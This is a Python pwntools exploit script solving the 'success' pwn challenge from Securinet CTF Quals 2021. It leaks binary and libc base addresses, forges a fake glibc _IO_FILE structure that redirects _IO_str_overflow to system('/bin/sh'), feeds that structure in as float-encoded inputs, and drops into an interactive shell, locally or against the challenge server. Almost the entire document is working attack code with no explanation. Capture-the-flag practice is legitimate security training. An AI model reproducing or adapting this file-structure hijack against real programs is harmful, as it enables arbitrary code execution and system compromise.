               #!/usr/bin/env python2

'''
Competition: Securinet CTF Quals 2021
Challenge Name: success
Type: pwn
Points: 1000 pts
Description: You have to study hard! 
'''

import pwn
import sys
import struct


class Chall:
    def __init__(self, local=True, debugger=True):
        pwn.context.update({'os': 'linux', 'arch': 'amd64'})
        self.elf = pwn.ELF('./main2_success')
        self.libc = pwn.ELF('./libc.so.6')        

        if local:
            _env = {'LD_PRELOAD':'./libc.so.6'}
            self.t = pwn.process(self.elf.path, env=_env)
        else:
            self.t = pwn.remote("bin.q21.ctfsecurinets.com", 1340)

        if debugger and local:
            gdb_cmd = ["b *addr", "c"]
            pwn.gdb.attach(self.t, gdbscript="\n".join(gdb_cmd))

    def interactive(self):
        self.t.interactive()

    def menu(self, idx):
        self.t.recvuntil('> ')
        self.t.sendline(str(idx))
        
    def get_leak(self, s):
        self.t.recvuntil(': ')
        self.t.send(s)
        data = self.t.recvline().split(b' ')[2]
        #print repr(data)
        leak = pwn.u64(data[-6:].ljust(8, b"\x00"))
        return leak
                    
                    
    def convert_to_float(self, i):
        #return struct.unpack('!f', hex(i)[2:].decode('hex'))[0] 
        return struct.unpack('!f', pwn.p32(i, endian='big'))[0]          
        
    
    def set_name(self, name):
        self.t.recvuntil(': ')
        self.t.sendline(name)
        
    def set_n_subjects(self, n):
        self.t.recvuntil('Provide number of subjects: ')
        self.t.sendline(str(n))        
        
    def add_subject(self, v):
        self.t.recvuntil(': ')
        self.t.sendline(str(v))
        #raw_input("next")

    def pwn(self):
        pwn.log.info("Starting pwning...")
        
        self.elf.address        = self.get_leak("a" * 8) - 0x1090
        self.libc.address       = self.get_leak("a" * 16) - 0x3e82a0
        system                  = self.libc.symbols['system']
        ch                      = self.elf.symbols['ch']
        _IO_file_jumps          = self.libc.symbols['_IO_file_jumps']
        _IO_str_overflow_ptr    = _IO_file_jumps + 0xd8
        _IO_2_1_stderr_         =  self.libc.symbols['_IO_2_1_stderr_']
        sh                      = next(self.libc.search(b"/bin/sh"))
        print("SH: ", sh) 
        
        self.set_name(b'AAAA')
        
        readable = self.elf.symbols['numbers']
        
        fake_file = pwn.flat([           
            pwn.p64(0),                 # flags
            pwn.p64(readable),          # _IO_read_ptr
            pwn.p64(readable),          # _IO_read_end
            pwn.p64(readable),          # _IO_read_base
            pwn.p64(0),                 # _IO_write_base
            pwn.p64((sh-100) // 2),      # _IO_write_ptr * 
            pwn.p64(readable),          # _IO_write_end
            pwn.p64(0),                 # _IO_buf_base
            pwn.p64((sh-100) // 2),      # _IO_buf_end *
            pwn.p64(0),                 # _IO_save_base
            pwn.p64(0),                 # _IO_backup_base
            pwn.p64(0),                 # _IO_save_end
            pwn.p64(0),                 # _IO_marker
            pwn.p64(_IO_2_1_stderr_),   # _IO_chain
            pwn.p32(3),                 # _fileno
            pwn.p32(0),                 # 
            pwn.p64(readable),          # _IO_lock_t
            pwn.p64(0), pwn.p64(readable), pwn.p64(0), pwn.p64(0),
            pwn.p64(0), pwn.p64(0), pwn.p64(0), pwn.p64(0), pwn.p64(0), pwn.p64(0), pwn.p64(0), 
            pwn.p64(_IO_str_overflow_ptr - 0x10),
            pwn.p64(system)
        ])


        pwn.log.info("binary           @ %s" % hex(self.elf.address))
        pwn.log.info("ch               @ %s" % hex(ch))
        pwn.log.info("libc             @ %s" % hex(self.libc.address))
        pwn.log.info("system           @ %s" % hex(system))
        pwn.log.info("_IO_file_jumps   @ %s" % hex(_IO_file_jumps))
        pwn.log.info("/bin/sh          @ %s" % hex(sh))
        
        n = 64
        self.set_n_subjects(n)
        
        size = 8
        chunks = [fake_file[i:i+size] for i in range(0, len(fake_file), size)]
        for chunk in chunks:
            n -= 2
            lo = self.convert_to_float(pwn.u32(chunk[0:4]))
            hi = self.convert_to_float(pwn.u32(chunk[4:8]))            
            self.add_subject(lo)
            self.add_subject(hi)
        
        while n > 0:
            self.add_subject(0.0)
            n -= 1
            
        #raw_input("a")
        lo = self.convert_to_float(ch & 0xffffffff)
        self.add_subject(lo)
    


chall = Chall(local=True, debugger=False)
chall.pwn()
chall.interactive()
